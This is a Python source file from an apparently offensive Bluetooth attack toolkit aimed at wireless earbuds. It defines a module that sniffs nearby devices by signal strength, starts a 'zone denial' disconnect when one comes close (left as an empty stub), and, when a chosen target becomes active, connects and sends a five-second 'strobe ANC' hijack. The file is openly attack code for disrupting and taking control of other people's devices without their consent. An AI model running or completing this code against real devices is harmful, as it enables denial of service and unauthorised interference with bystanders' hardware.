import time
from rich.console import Console
from core.connection import AAPConnection
from modules.hijack import HijackModule
from modules.sniffer import SnifferModule
from modules.denial_of_service import DoSModule

class ContextAttackModule:
    def __init__(self, console: Console):
        self.console = console
        self.sniffer = SnifferModule(console=console)
        self.active_attacks = []
        self.mode = None
        self.target_mac = None
        self.rssi_history = {} 

    def start_zone_denial(self, rssi_threshold=-60, smart=True):
        self.mode = 'zone'
        self.rssi_threshold = rssi_threshold
        smart_str = " (Smart Debounce Active)" if smart else ""
        self.console.print(f"[bold red][*] Starting Zone Denial Attack{smart_str}...[/bold red]")
        self.sniffer.start_sniff(callback=lambda m, r, d: self._zone_callback(m, r, d, smart))

    def _zone_callback(self, mac, rssi, data, smart=False):
        if mac not in self.rssi_history:
            self.rssi_history[mac] = []
        self.rssi_history[mac].append(rssi)
        if len(self.rssi_history[mac]) > 5:
            self.rssi_history[mac].pop(0)

        trigger = False
        if smart:
            avg_rssi = sum(self.rssi_history[mac]) / len(self.rssi_history[mac])
            if len(self.rssi_history[mac]) >= 3 and avg_rssi >= self.rssi_threshold:
                trigger = True
        else:
            if rssi >= self.rssi_threshold:
                trigger = True

        if trigger:
            self.console.print(f"[bold red][!] PROXIMITY ALERT: {mac} (RSSI: {rssi})[/bold red]")
            self.console.print(f"[bold red][*] Triggering Zone Denial (Quick Disconnect) on {mac}...[/bold red]")
            
            try:
                pass
            except:
                pass

    def start_activity_trigger(self, target_mac):
        self.mode = 'activity'
        self.target_mac = target_mac
        self.console.print(f"[bold red][*] Starting Activity Trigger (Target: {target_mac})[/bold red]")
        self.console.print("[dim]Waiting for A2DP / In-Ear status...[/dim]")
        self.sniffer.start_sniff(target_mac=target_mac, callback=self._activity_callback)

    def _activity_callback(self, mac, rssi, data):
        if self.target_mac and mac.lower() != self.target_mac.lower():
            return

        status_hex = data.get("status_raw", "00")
        status_int = int(status_hex, 16)
        
        if status_int != 0:
             self.console.print(f"[bold yellow][!] Activity Detected on {mac} (Status: {status_hex})[/bold yellow]")
             self.console.print("[bold red][*] Triggering Strobe ANC Attack![/bold red]")
             
             try:
                 conn = AAPConnection(mac, console=self.console)
                 if conn.connect():
                     hijack = HijackModule(conn, self.console)
                     hijack.trigger_strobe_anc(duration_sec=5)
                     conn.close()
             except Exception as e:
                 self.console.print(f"[red]Attack trigger failed (resource busy?): {e}[/red]")

